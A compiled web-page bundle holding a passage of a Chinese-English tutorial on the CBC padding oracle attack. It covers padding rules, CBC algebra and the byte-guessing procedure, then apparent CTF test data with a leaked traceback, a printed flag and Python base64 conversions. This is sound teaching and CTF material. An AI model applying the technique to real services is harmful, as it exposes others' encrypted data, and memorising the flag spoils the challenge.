(window.webpackJsonp=window.webpackJsonp||[]).push([[86],{316:function(t,s,a){"use strict";a.r(s);var n=a(0),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("p",[t._v("this vulnerability is not related to the Oracle database or the Oracle Company in any way. In cryptography, an ‘oracle’ is a system that performs cryptographic actions by taking in certain input. Hence a ‘padding oracle’ is a type of system that takes in encrypted data from the user, decrypts it and verifies whether the padding is correct or not.")]),t._v(" "),a("p",[t._v("There are two types of encryption schemes:")]),t._v(" "),a("ol",[a("li",[t._v("Symmetric key encryption: Encryption and decryption keys are the same.")]),t._v(" "),a("li",[t._v("Asymmetric key encryption: Encryption and decryption keys are not the same.")])]),t._v(" "),a("p",[t._v("Symmetric key encryption can use either stream ciphers or block ciphers. A stream cipher encrypts one bit at a time, while a block cipher encrypts plaintext in chunks. Once again, even in this article we need to learn more about block ciphers. So here are the two notable points about block ciphers.")]),t._v(" "),a("ul",[a("li",[t._v("They operate on fixed size data (eg. 64-bit for DES, 128-bit for AES, etc.)")]),t._v(" "),a("li",[t._v("They operate in modes. There are different modes of operation, such as CBC, ECB, etc.")])]),t._v(" "),a("h2",{attrs:{id:"原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#原理"}},[t._v("#")]),t._v(" 原理")]),t._v(" "),a("h3",{attrs:{id:"基础"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#基础"}},[t._v("#")]),t._v(" 基础")]),t._v(" "),a("p",[t._v("Message->Encoded Data->Ciphertext")]),t._v(" "),a("p",[t._v("padding oracle是chosen cipher attack类型的一个比较好的例子")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("XOR异或操作")]),t._v(" "),a("p",[t._v("特点是可以抵消，0001 xor 0001 = 0000")])]),t._v(" "),a("li",[a("p",[t._v("明文(Encoded Data)必须满足padding规则")]),t._v(" "),a("p",[t._v("Let L be the block length(size) in bytes of the cipher;")]),t._v(" "),a("p",[t._v("Let b be the # of bytes that need to be appended to the message to get length a multiple of L; 1<=b<=L, note b<>0;")]),t._v(" "),a("p",[t._v("Append b(encoded in 1 byte), b times, if 3 bytes of padding are needed, append 0x030303;")]),t._v(" "),a("p",[t._v("PKCS#5:blocksize是8bytes")]),t._v(" "),a("p",[t._v("PKCS#7:blocksize可以是1-255bytes")]),t._v(" "),a("p",[t._v("举例：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("假设采用PKCS#7，\nMessage：SECRET MESSAGE（注意包括空格，假设我们的encoding是很简单的ascii，\nEoncoedeData就是hex表示的0x534543524554204d455353414745 一个字节就是一个字符，现在是长度14）\n假设blocksize=8，8+6+2\nS|E|C|R|E|T| |M|E|S|S|A|G|E|02|02\n如果blocksize=16，14+2\nS|E|C|R|E|T| |M|E|S|S|A|G|E|02|02\n如果blocksize=15，14+1\nS|E|C|R|E|T| |M|E|S|S|A|G|E|01\n如果blocksize=14呢，14+0？不对，根据上面规则b<>0，所以只能取14，补足14个0x0e\nS|E|C|R|E|T| |M|E|S|S|A|G|E|0e|0e|....|0e\n")])])]),a("p",[t._v("而所谓的padding oracle就是说，一般程序从密文中解密出encode data之后会先做padding的检查，失败会报错padding exception或者有其他可以用于判断的依据，比如处理时间等等“回显点”，even if an error is not explicitly returned, and attacker might be able to detect differences in timing, behavior,etc从而我们可以去猜测起码这个是不是合法的padding，这是后面攻击很重要的一个点")])]),t._v(" "),a("li",[a("p",[t._v("加密")]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/padding_oracle01.png",alt:""}})]),t._v(" "),a("p",[t._v("Ci = Ek(Pi ⊕ Ci-1), and C0 = IV")]),t._v(" "),a("p",[t._v("Ek是加密算法，k是AES或DES密钥，Ci代表第i个block对应的密文，Pi代表第i个block的明文或encoded data，注意第一个block采用了IV是因为，可以想象如果C0直接用Ek(P0)，即用第一个block的明文加密的话，比如")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("P0=S|E|C|R|E|T| |M\nC0=0X1122334455667788\n那么每个以P0开头的明文加密结果都是以C0开头，相信你会觉着跟md5的彩虹表攻击类似，所以这样很不好，所以需要IV就是这里的“盐”\n\n It’s important to note that here IV is not a secret; it only adds randomness to the output. IV is sent along with the message in clear text format.\n")])])])]),t._v(" "),a("li",[a("p",[t._v("解密")]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/padding_oracle02.png",alt:""}})]),t._v(" "),a("p",[t._v("Pi = Dk(Ci) ⊕ Ci-1, and C0 = IV")]),t._v(" "),a("p",[t._v("Use CBC mode decryption to obtain encoded data;")]),t._v(" "),a("p",[t._v("Validation the final byte of encoded data that has value b:")]),t._v(" "),a("ul",[a("li",[t._v("if b=0 or b>L(blocksize), return error;")]),t._v(" "),a("li",[t._v("if final b bytes of encoded data are not all equal to b, return error")]),t._v(" "),a("li",[t._v("otherwise, strip off the final b bytes of value b, and output what is left as the message")])])])]),t._v(" "),a("h3",{attrs:{id:"攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻击"}},[t._v("#")]),t._v(" 攻击")]),t._v(" "),a("p",[t._v("given two-block ciphertext IV,c0，最简单的我们的明文或叫encoded data是P只有一个block P1，所以加密后加上IV只有两个block:")]),t._v(" "),a("p",[t._v("c=(C0,C1) C0 = IV\t生成的密文IV是prepend前面作为第一个block")]),t._v(" "),a("p",[t._v("C1 = Ek(P1 ⊕ C0)")]),t._v(" "),a("p",[t._v("P1 = Dk(C1) ⊕ C0 = Dk(C1) ⊕ IV")]),t._v(" "),a("p",[t._v("Main observation: if an attacker modifies the ith byte of IV, this causes a predictable change (only) to the ith byte of the encoded data")]),t._v(" "),a("p",[t._v("我们如何获取P1呢")]),t._v(" "),a("p",[t._v("let g be the guess for the last byte of  P1（这里的last byte是指第一位）")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("last-byte-of(P1) \n= last-byte-of(Dk(C1) ⊕ C0) \n= last-byte-of(Dk(C1) ⊕ IV)\n\nC0'=C0⊕ 0x0g⊕ 0x01\n\nP1'=Dk(C1) ⊕ C0'= Dk(C1) ⊕ IV'\n=Dk(C1) ⊕ IV  ⊕ 0x0g⊕ 0x01\n=P1 ⊕ 0x0g⊕ 0x01\n\n假设P1  ⊕ 0x0g的可以消掉最后这个字节，意思是我们猜出了P1的最后一个字节就是0x0g，则\n=>\nlast-byte-of(P1') = last-byte-of(P1 ⊕ 0x0g⊕ 0x01) = 0x01\n前面说过\n0x01\n0x0202\n0x030303\n都是合法的padding，发送C0'|C1到服务可以通过padding validate（服务器会根据C0'和C1 算P1 = Dk(C1) ⊕ C0'\n\n推广到比如，假设每个block是8 bytes\nc=(C0,C1,C2,....Ci)\n倒序破解 （当然我们也可以正序破解，从C1开始)\n构造C(i-1)' = C(i-1)⊕ 0x0g⊕ 0x01\n发送C(i-1)'|Ci到服务器，通过padding oracle来判断0x0g是不是正确的，从而获得Ci所对应的明文Pi的第一个字节；\n假设Pi的第一个字节是0a\n=》\n继续破解Pi的第二个字节\n构造C(i-1)' = C(i-1)⊕ 0x0g0a⊕ 0x0202\n发送C(i-1)'|Ci到服务器，通过padding oracle来判断0x0g是不是正确的，从而获得Ci所对应的明文Pi的第二个字节；\n假设Pi的第二个字节是0b\n=》\n继续破解Pi的第八个字节\n构造C(i-1)' = C(i-1)⊕ 0x0g....0b0a⊕ 0x10101010101010101010101010101010\n发送C(i-1)'|Ci到服务器，通过padding oracle来判断0x0g是不是正确的，从而获得Ci所对应的明文Pi的第八个字节；\n假设Pi的第八个字节是0h\n从而得到Pi整个明文 0h.....0b0a\n\n继续往前循环\n构造C(i-2)' = C(i-2)⊕ 0x0g⊕ 0x01\n发送C(i-2)'|C(i-1)到服务器，通过padding oracle来判断0x0g是不是正确的，从而获得C(i-1)所对应的明文P(i-1)的第一个字节；\n.......\n直到最后一个是\n构造C0' = C0⊕ 0x0g⊕ 0x01=IV⊕ 0x0g⊕ 0x01\n发送C0'|C1即 IV'|C1到服务器。。。。从而获得C1所对应的明文P1的第一个字节\n\n")])])]),a("h2",{attrs:{id:"测试"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#测试"}},[t._v("#")]),t._v(" 测试")]),t._v(" "),a("h3",{attrs:{id:"测试数据"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#测试数据"}},[t._v("#")]),t._v(" 测试数据")]),t._v(" "),a("p",[t._v("原始数据：")]),t._v(" "),a("p",[t._v("http://host/?post=AGhcUqLmBmKALbwtAloozXAQGG1kL35HgWkmeLGrvHSg96WOkmjauFXFgIUwPIZ1nNVz7EE35OqBs27OYI2CCvuf3VMX!LCtZeW4H4YpIsBbI-yDExlCtDhcZhMrBN9YtQwK7rB5cfBq2f-J!zb5BQkVmaK45IA!IP2FyU0WVS6ooKSkSCoTWoTe1H9QNv6DfdL7cBMc!y!Pr6L8SZQYfg~~")]),t._v(" "),a("p",[t._v("这个数据实际上是经过转换的，本身是base64，然后由于在url中，所以要替换其中的一些特殊字符(注意，我这里是说浏览器的地址栏中url如果有+/=特殊字符，会有问题，比如截断，但是通过代码脚本发送是没问题的)：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("^FLAG^c29e52e1c380c19727baeced72b21025e1c4f172fdb7009e8deb34b0d7abb8af$FLAG$\nTraceback (most recent call last):\n  File \"./main.py\", line 69, in index\n    post = json.loads(decryptLink(postCt).decode('utf8'))\n  File \"./common.py\", line 46, in decryptLink\n    data = b64d(data)\n  File \"./common.py\", line 11, in <lambda>\n    b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))\n  File \"/usr/local/lib/python2.7/base64.py\", line 328, in decodestring\n    return binascii.a2b_base64(s)\nError: Incorrect padding\n")])])]),a("p",[t._v("所以将其恢复成正常的base64如下进行python语法的基本数据转换测试")]),t._v(" "),a("p",[t._v("AGhcUqLmBmKALbwtAloozXAQGG1kL35HgWkmeLGrvHSg96WOkmjauFXFgIUwPIZ1nNVz7EE35OqBs27OYI2CCvuf3VMX!LCtZeW4H4YpIsBbI-yDExlCtDhcZhMrBN9YtQwK7rB5cfBq2f-J!zb5BQkVmaK45IA!IP2FyU0WVS6ooKSkSCoTWoTe1H9QNv6DfdL7cBMc!y!Pr6L8SZQYfg~~")]),t._v(" "),a("p",[t._v("=>")]),t._v(" "),a("p",[t._v("AGhcUqLmBmKALbwtAloozXAQGG1kL35HgWkmeLGrvHSg96WOkmjauFXFgIUwPIZ1nNVz7EE35OqBs27OYI2CCvuf3VMX/LCtZeW4H4YpIsBbI+yDExlCtDhcZhMrBN9YtQwK7rB5cfBq2f+J/zb5BQkVmaK45IA/IP2FyU0WVS6ooKSkSCoTWoTe1H9QNv6DfdL7cBMc/y/Pr6L8SZQYfg==")]),t._v(" "),a("div",{staticClass:"language-python extra-class"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" base64\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("str")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AGhcUqLmBmKALbwtAloozXAQGG1kL35HgWkmeLGrvHSg96WOkmjauFXFgIUwPIZ1nNVz7EE35OqBs27OYI2CCvuf3VMX/LCtZeW4H4YpIsBbI+yDExlCtDhcZhMrBN9YtQwK7rB5cfBq2f+J/zb5BQkVmaK45IA/IP2FyU0WVS6ooKSkSCoTWoTe1H9QNv6DfdL7cBMc/y/Pr6L8SZQYfg=="')]),t._v("\n虽然这里是"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("ascii")]),t._v("码，一个"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("ascii")]),t._v("是一个字节，但是这里是base64编码，所以这里的一个"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("ascii")]),t._v("码表示的是base64的"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("个位所代表的一个“显示"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("ascii")]),t._v("码”（一个可打印字符），而实际上base64不是一个个"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("位去对应的（是"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("位对应"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v("个字符），还有以下规则：\nbase64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("^")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("64")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("位表示一个base64编码，标准"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("Base64"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("只有"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("64")]),t._v("个字符（英文大小写、数字和"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("、"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("）以及用作后缀等号； "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("Base64"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("是把"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v("个字节变成"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v("个可打印字符（"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v("×"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v("×"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("，为什么这样？因为"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("和"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v("的最大公约数是"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("，所以要让"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("位的base64系统跟"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v("位的"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v("系统切换，就补足），所以"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("Base64编码"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("后的字符串一定能被"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v("整除（不算用作后缀的等号）； 等号一定用作后缀，且数目一定是"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("个、"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("个或"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("个。 这是因为如果原文"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("长度"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("不能被"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v("整除，"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("Base64"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("**")]),t._v("要在后面添加\\"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("凑齐3n位\n\n错误算法：\n长度"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("216")]),t._v("，总共："),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("216")]),t._v("×"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1296")]),t._v("位 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1296")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("162")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v("\n如果硬算字节的话：\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("216")]),t._v("减去补足的两个"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("是"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("214")]),t._v("，每个是"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("位，"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("214")]),t._v("×"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("160.5")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v("\n\n正确算法：\nbase64不是简单的一个"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("位对应一个字符，而是每"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("位对应一个\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("216")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("54")]),t._v("组（一组"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v("个字符，对应"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v("个字节）对应"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("54")]),t._v("×"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("162")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v("，\n但是最后一组比较特殊Pg"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v("，去掉再计算：\n（"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("216")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v("）"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("53")]),t._v("组对应 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("53")]),t._v("×"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("159")]),t._v("个字节，再加上最后Pg"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v("编码是 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("001111")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("100000")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("000000")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("000000")]),t._v(" \n去掉补足的两个字节就变成 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("001111")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),t._v("（"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0000")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("000000")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("000000")]),t._v(" ）刚好"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("001111")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),t._v("是一个完整字节，所以"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("159")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("160")]),t._v("\nhttps"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v("cryptii"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("pipes"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("base64"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("to"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),t._v("\n    \n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("base64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("standard_b64decode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("b'\\x00h\\\\R\\xa2\\xe6\\x06b\\x80-\\xbc-\\x02Z(\\xcdp\\x10\\x18md/~G\\x81i&x\\xb1\\xab\\xbct\\xa0\\xf7\\xa5\\x8e\\x92h\\xda\\xb8U\\xc5\\x80\\x850<\\x86u\\x9c\\xd5s\\xecA7\\xe4\\xea\\x81\\xb3n\\xce`\\x8d\\x82\\n\\xfb\\x9f\\xddS\\x17\\xfc\\xb0\\xade\\xe5\\xb8\\x1f\\x86)\"\\xc0[#\\xec\\x83\\x13\\x19B\\xb48\\\\f\\x13+\\x04\\xdfX\\xb5\\x0c\\n\\xee\\xb0yq\\xf0j\\xd9\\xff\\x89\\xff6\\xf9\\x05\\t\\x15\\x99\\xa2\\xb8\\xe4\\x80? \\xfd\\x85\\xc9M\\x16U.\\xa8\\xa0\\xa4\\xa4H*\\x13Z\\x84\\xde\\xd4\\x7fP6\\xfe\\x83}\\xd2\\xfbp\\x13\\x1c\\xff/\\xcf\\xaf\\xa2\\xfcI\\x94\\x18~'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("upper"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("00685C52A2E60662802DBC2D025A28CD7010186D642F7E4781692678B1ABBC74A0F7A58E9268DAB855C58085303C86759CD573EC4137E4EA81B36ECE608D820AFB9FDD5317FCB0AD65E5B81F862922C05B23EC83131942B4385C66132B04DF58B50C0AEEB07971F06AD9FF89FF36F905091599A2B8E4803F20FD85C94D16552EA8A0A4A4482A135A84DED47F5036FE837DD2FB70131CFF2FCFAFA2FC4994187E")]),t._v("\n长度"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("320")]),t._v("，"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("320")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("160")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v("\n\n下面反向验证下：\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" bytes_new"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytearray")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fromhex"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("bytes_new"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytearray")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("b'\\x00h\\\\R\\xa2\\xe6\\x06b\\x80-\\xbc-\\x02Z(\\xcdp\\x10\\x18md/~G\\x81i&x\\xb1\\xab\\xbct\\xa0\\xf7\\xa5\\x8e\\x92h\\xda\\xb8U\\xc5\\x80\\x850<\\x86u\\x9c\\xd5s\\xecA7\\xe4\\xea\\x81\\xb3n\\xce`\\x8d\\x82\\n\\xfb\\x9f\\xddS\\x17\\xfc\\xb0\\xade\\xe5\\xb8\\x1f\\x86)\"\\xc0[#\\xec\\x83\\x13\\x19B\\xb48\\\\f\\x13+\\x04\\xdfX\\xb5\\x0c\\n\\xee\\xb0yq\\xf0j\\xd9\\xff\\x89\\xff6\\xf9\\x05\\t\\x15\\x99\\xa2\\xb8\\xe4\\x80? \\xfd\\x85\\xc9M\\x16U.\\xa8\\xa0\\xa4\\xa4H*\\x13Z\\x84\\xde\\xd4\\x7fP6\\xfe\\x83}\\xd2\\xfbp\\x13\\x1c\\xff/\\xcf\\xaf\\xa2\\xfcI\\x94\\x18~'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" base64Str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" base64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("standard_b64encode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("bytes_new"),a("span",{pre:!0,attrs:{class:"token 